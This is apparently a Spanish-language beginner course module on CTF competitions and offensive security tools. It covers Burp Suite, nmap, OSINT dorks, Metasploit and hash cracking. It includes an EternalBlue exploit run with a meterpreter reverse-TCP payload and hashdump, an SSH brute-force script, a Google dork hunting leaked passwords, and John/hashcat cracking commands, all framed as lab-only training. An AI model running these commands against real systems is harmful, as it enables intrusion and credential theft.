# Semana 7 — CTF y Herramientas: tu primer reto de hacking

> Objetivo: usar herramientas profesionales y resolver tu primer CTF.

---

## Que es un CTF

CTF = Capture The Flag. Competencia donde resuelves retos de seguridad para encontrar una "bandera" (flag) como `flag{esto_es_una_flag_xyz}`.

**Categorias tipicas:**
- **Web** — vulnerabilidades web (SQLi, XSS, SSRF)
- **Criptografia** — descifrar mensajes, romper cifrados debiles
- **Forense** — analizar archivos, capturas de red, imagenes de disco
- **Reversing** — analizar binarios sin codigo fuente
- **Pwn/Binary** — explotar buffer overflows
- **OSINT** — investigar usando fuentes publicas

---

## Plataformas recomendadas para empezar

| Plataforma | Nivel | Estilo |
|-----------|-------|--------|
| TryHackMe | Principiante | Guiado, habitaciones tematicas |
| PicoCTF | Principiante | Retos individuales, muy bueno |
| Hack The Box Starting Point | Intermedio | Maquinas reales |
| CTFtime.org | Todos | Calendario de competencias |

**Para empezar:** TryHackMe — Pre-Security Path (gratis, ~40 horas).

---

## Burp Suite — La herramienta del pentester web

Burp Suite actua como proxy entre tu navegador y el servidor. Puedes ver, modificar y repetir cualquier request HTTP.

### Configuracion basica

1. Abrir Burp Suite Community
2. Ir a `Proxy > Options` — verificar que escucha en `127.0.0.1:8080`
3. En el navegador (Firefox recomendado): configurar proxy manual `127.0.0.1:8080`
4. Instalar certificado de Burp en el navegador (para HTTPS)
   - Ir a `http://burpsuite` desde el navegador con proxy activo
   - Descargar e instalar el CA certificate

### Flujo de trabajo

```
Navegador  →  Burp Proxy  →  Servidor
              [intercepta]
              [puedes modificar]
```

### Funciones principales

**Intercept (Proxy > Intercept ON):**
- Pausa cada request antes de enviarlo
- Puedes modificar parametros, headers, cookies, body
- Click en "Forward" para continuar

**Repeater:**
- Guarda un request para repetirlo con modificaciones
- Ideal para probar SQLi, XSS, IDOR
- `Click derecho en request > Send to Repeater`

**Intruder:**
- Automatiza ataques de fuerza bruta o fuzzing
- Marcar el parametro variable con `§valor§`
- Cargar una wordlist y ejecutar

**Decoder:**
- Codificar/decodificar Base64, URL encoding, HTML entities
- `Ctrl+Shift+D`

### Practica con WebGoat

```bash
# Levantar WebGoat
docker run -p 8081:8080 -t webgoat/webgoat

# Con Burp interceptando, navegar a:
http://localhost:8081/WebGoat/login
```

---

## nmap avanzado

```bash
# Detectar OS y versiones de servicio
nmap -sV -O 192.168.1.1

# Escaneo agresivo (version + OS + scripts + traceroute)
nmap -A 192.168.1.1

# Scripts NSE (Nmap Scripting Engine)
nmap --script vuln 192.168.1.1          # buscar vulnerabilidades conocidas
nmap --script http-enum 192.168.1.1     # enumerar directorios web
nmap --script ssh-brute 192.168.1.1     # brute force SSH (solo en lab!)

# Escaneo de red completa
nmap -sn 192.168.1.0/24   # descubrir hosts activos (sin escanear puertos)

# Output en todos los formatos
nmap -oA resultados 192.168.1.1   # genera .nmap .gnmap .xml
```

---

## Reconocimiento OSINT

OSINT = Open Source Intelligence. Recopilar informacion publica antes de atacar.

```bash
# Informacion de dominio
whois google.com
dig google.com ANY
dig google.com MX

# Subdominios
subfinder -d google.com          # pip install subfinder
amass enum -d google.com         # mas completo

# Google Dorks — busquedas avanzadas en Google
site:empresa.com filetype:pdf
site:empresa.com inurl:admin
site:empresa.com "Index of /"    # directory listing
"@empresa.com" "password"        # buscar credenciales filtradas

# Shodan — buscador de dispositivos conectados a internet
shodan search "apache 2.4" country:MX
# Muy util para encontrar servicios expuestos

# Have I Been Pwned — verificar si un email fue comprometido
curl "https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com"
```

---

## Metasploit — framework de explotacion (solo en laboratorio)

```bash
# Iniciar (en Kali)
msfconsole

# Buscar exploits
search eternalblue
search type:exploit platform:windows

# Usar un exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Comandos en meterpreter (post-explotacion)
sysinfo
getuid
hashdump    # extraer hashes de passwords
```

**CRITICO:** Metasploit SOLO en laboratorios virtuales (TryHackMe, Hack The Box, VMs propias). Nunca en sistemas reales.

---

## Primer CTF — guia paso a paso (TryHackMe)

### Paso 1: Registrarse
1. Ir a tryhackme.com
2. Crear cuenta gratuita
3. Descargar OpenVPN y conectar a la red de TryHackMe

### Paso 2: Pre-Security Path (primera semana)
Completar en orden:
1. "Introduction to Cybersecurity" (1 hora)
2. "Network Fundamentals" (3 horas)
3. "How The Web Works" (2 horas)

### Paso 3: Tu primer room
**Room recomendado:** "OHsint" (OSINT, facil, muy divertido)

Metodologia para cualquier room:
```
1. Leer la descripcion completa
2. Hacer el setup (conectar VPN si es necesario)
3. Empezar con lo basico: nmap, enumerar el objetivo
4. Buscar pistas en la descripcion
5. Si te atascas: ver hints (cuestan puntos) o buscar "writeup" en Google
```

---

## Criptografia clasica en CTF

```python
# ROT13 — cifrado de rotacion
import codecs
codecs.encode("Hello World", "rot_13")  # "Uryyb Jbeyq"

# Caesar cipher
def caesar(texto, shift):
    resultado = ""
    for c in texto:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            resultado += chr((ord(c) - base + shift) % 26 + base)
        else:
            resultado += c
    return resultado

# Base64
import base64
base64.b64decode("SGVsbG8gV29ybGQ=").decode()  # "Hello World"
base64.b64encode(b"flag{secret}").decode()

# XOR
def xor_bytes(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

# Hex a texto
bytes.fromhex("48656c6c6f").decode()  # "Hello"
```

---

## Herramientas de apoyo en CTF

```bash
# file — identificar tipo de archivo
file archivo_misterioso

# strings — extraer texto de binarios
strings archivo.exe | grep "flag{"

# hexdump
xxd archivo | head -20
hexdump -C archivo | head -20

# exiftool — metadata de imagenes (OSINT, esteganografia)
exiftool imagen.jpg

# steghide — esteganografia (ocultar datos en imagenes)
steghide extract -sf imagen.jpg -p ""
steghide info imagen.jpg

# John the Ripper — crackear hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

# hashcat — crackear hashes con GPU
hashcat -m 0 hash.txt wordlist.txt    # MD5
hashcat -m 1800 hash.txt wordlist.txt # SHA-512crypt
```
